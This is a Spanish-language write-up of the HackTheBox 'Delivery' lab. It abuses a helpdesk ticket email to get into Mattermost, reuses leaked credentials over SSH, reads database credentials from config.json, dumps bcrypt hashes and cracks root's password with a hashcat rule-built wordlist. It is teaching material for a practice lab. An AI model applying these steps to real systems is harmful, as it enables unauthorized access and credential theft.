---
title: HTB - Delivery
published: true
categories: [Linux]
tags: [eJPT, eWPT, Fácil]
---

<img src="/assets/HTB/Delivery/delivery.png">

¡Hola!
Vamos a resolver de la máquina `Delivery` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Virtual Hosting Enumeration**
- **Abusing Support Ticket System**
- **Access to MatterMost**
- **Information Leakage**
- **Database Enumeration - MYSQL**
- **Cracking Hashes**
- **Playing with hashcat rules in order to create passwords**
- **Playing with sucrack to find out a user's password**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Delivery`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.222
PING 10.10.10.222 (10.10.10.222) 56(84) bytes of data.
64 bytes from 10.10.10.222: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.222 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.222 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
8065/tcp open  unknown syn-ack ttl 63

```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,8065 10.10.10.222 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 09 Nov 2022 14:35:46 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: buwr7khkwjfrmpfh9dz8y6ti5e
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 09 Nov 2022 14:38:22 GMT
```

### Reconocimiento Web

* * *

Al acceder a la web vemos que se trata de un sistema de reportes vía ticket. Hacen mención a un HelpDesk que redirige al dominio `helpdesk.delivery.htb` y al dominio `delivery.htb`. Procedemos a incorporarlo a nuestro `/etc/hosts`


<img src="/assets/HTB/Delivery/contact.png">



Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://delivery.htb
http://delivery.htb [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.129.100.216], JQuery, Script, Title[Welcome], nginx[1.14.2]
❯ whatweb http://helpdesk.delivery.htb
http://helpdesk.delivery.htb [200 OK] Bootstrap, Content-Language[en-US], Cookies[OSTSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], HttpOnly[OSTSESSID], IP[10.129.100.216], JQuery[3.5.1], PoweredBy[osTicket], Script[text/javascript], Title[delivery], UncommonHeaders[content-security-policy], X-UA-Compatible[IE=edge], nginx[1.14.2]
```

Bajo el dominio `http://helpdesk.delivery.htb` vemos un sistema de tickets que corre bajo `osTicket` y en `http://delivery.htb:8065/` observamos un panel de login para acceder a la plataforma Mattermost


<img src="/assets/HTB/Delivery/osticket.png">



<img src="/assets/HTB/Delivery/matterlogin.png">


Empezamos con el reconocimiento de `http://helpdesk.delivery.htb`. No podemos registrar una cuenta debido a que pide correo de confirmación pero podemos dar de alta un ticket como `guest user`


<img src="/assets/HTB/Delivery/ticket.png">


El sistema de tickets nos asigna un id de ticket y a la vez observamos que podemos añadir información enviando un email a un correo temporal que se ha creado con la misma id del ticket generado. Podemos consultar el ticket desde la pestaña `Check Ticket Status` en cualquier momento

Probamos a registrar una nueva cuenta usando el email temporal generado en el ticket a ver si nos llega algún tipo de información en el ticket creado pero no llegamos a nada. Probamos lo mismo pero esta vez con el panel de `Mattermost` y esta vez si que vemos algo en el ticket


<img src="/assets/HTB/Delivery/emailconfirm.png">


Copiamos la url donde se confirma el correo y confirmamos la cuenta creada. Ya podemos acceder a Mattermost


<img src="/assets/HTB/Delivery/mattermost.png">


Vemos una conversación donde se filtran unas credenciales. Probamos por si se reutilizan para acceder por ssh

```bash
❯ ssh maildeliverer@10.10.10.222
maildeliverer@10.10.10.222 s password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov  9 10:25:19 2022 from 10.10.14.19
maildeliverer@Delivery:~$
```

La flag de usuario la podemos encontrar en el mismo directorio donde nos encotramos

```bash
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt 
d8bde448ecac82ba8****************
```

### Escalada Privilegios

* * *

Buscamos por procesos en ejecución y filtramos por mattermost y observamos que reside en `/opt`

```bash
maildeliverer@Delivery:/opt/mattermost/config$ ps -faux | grep -i mattermost
maildel+ 16083  0.0  0.0   6048   824 pts/0    S+   11:37   0:00              \_ grep -i mattermost
matterm+   776  0.1  3.5 1797124 142740 ?      Ssl  09:35   0:10 /opt/mattermost/bin/mattermost
matterm+  1034  0.0  0.5 1161840 20576 ?       Sl   09:38   0:00  \_ plugins/com.mattermost.plugin-channel-export/server/dist/plugin-linux-amd64
matterm+  1041  0.0  0.6 1239060 26520 ?       Sl   09:38   0:00  \_ plugins/com.mattermost.nps/server/dist/plugin-linux-amd64
```
Localizamos un archivo `config.json`

```bash
maildeliverer@Delivery:/opt/mattermost/config$ ls
README.md  cloud_defaults.json  config.json
```
Después de observar detenidamente el archivo podemos extraer credenciales para acceso MySQL

```java
"SqlSettings": {
    "DriverName": "mysql",
    "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
    "DataSourceReplicas": [],
    "DataSourceSearchReplicas": [],
    "MaxIdleConns": 20,
    "ConnMaxLifetimeMilliseconds": 3600000,
    "MaxOpenConns": 300,
    "Trace": false,
    "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
    "QueryTimeout": 30,
    "DisableDatabaseSearch": false
},
```
```sql
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 164
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)

MariaDB [mattermost]> describe Users;
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
| AuthService        | varchar(32)  | YES  |     | NULL    |       |
| Email              | varchar(128) | YES  | UNI | NULL    |       |
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
| FirstName          | varchar(64)  | YES  |     | NULL    |       |
| LastName           | varchar(64)  | YES  |     | NULL    |       |
| Position           | varchar(128) | YES  |     | NULL    |       |
| Roles              | text         | YES  |     | NULL    |       |
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
| Props              | text         | YES  |     | NULL    |       |
| NotifyProps        | text         | YES  |     | NULL    |       |
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
| Locale             | varchar(5)   | YES  |     | NULL    |       |
| Timezone           | text         | YES  |     | NULL    |       |
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+
25 rows in set (0.001 sec)

MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| yorch2                           | $2a$10$V0ziK47rzu8a8s3/xf3W2OE.CZaqhk2rnyX5jWItXppjYCY9/hiyO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| yorch                            | $2a$10$t9OIml/DsJ9n7CxOwzX43OtR1jj.6Uz40jv.jEAeD6RcJUC9E2fRq |
+----------------------------------+--------------------------------------------------------------+
9 rows in set (0.000 sec)
```
Hemos encontrado el hash de la contraseña de root! Utilizamos `hashcat` y el diccionario `rockyou.txt` pero no logramos crackear la password. Si volvemos a revisar la conversación encontrada en Mattermost el admin nos da una pista, comenta que tienen que cambiar la contraseña que la mayoría empiezan por **PleaseSubscribe!**. Con hashcat creamos un diccionario personalizado con variantes de la pista proporcionada

```bash
❯ echo "PleaseSubscribe\!" > pass

❯ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule pass > passwords.txt
❯ cat passwords.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: passwords.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ PleaseSubscribe!
   2   │ !ebircsbuSesaelP
   3   │ PLEASESUBSCRIBE!
   4   │ pleaseSubscribe!
   5   │ PleaseSubscribe!0
   6   │ PleaseSubscribe!1
   7   │ PleaseSubscribe!2
   8   │ PleaseSubscribe!3
   9   │ PleaseSubscribe!4
.
.
.
.
.
```

Probamos de nuevo con hashcat y nuestro diccionario personalizado

```bash
❯ hashcat -m 3200 -a 0 hash passwords.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 5 3600X 6-Core Processor, 13860/13924 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: pass
* Passwords.: 77
* Bytes.....: 1177
* Keyspace..: 77
* Runtime...: 0 secs

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Wed Nov  9 19:08:17 2022 (1 sec)
Time.Estimated...: Wed Nov  9 19:08:18 2022 (0 secs)
Guess.Base.......: File (pass)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       43 H/s (12.52ms) @ Accel:8 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32/77 (41.56%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 0/77 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidates.#1....: PleaseSubscribe! -> PleaseSubscribs

Started: Wed Nov  9 19:07:40 2022
Stopped: Wed Nov  9 19:08:19 2022
```
Ya tenemos la contraseña de root. Migramos con `su` a root y proporcionamos la password crackeada y en el directorio `/root` localizamos la flag

```bash
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# cat /root/root.txt
4bd6d0947e6c5af09***************
```

Hemos completado la máquina **Delivery** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Delivery/pwned.png">
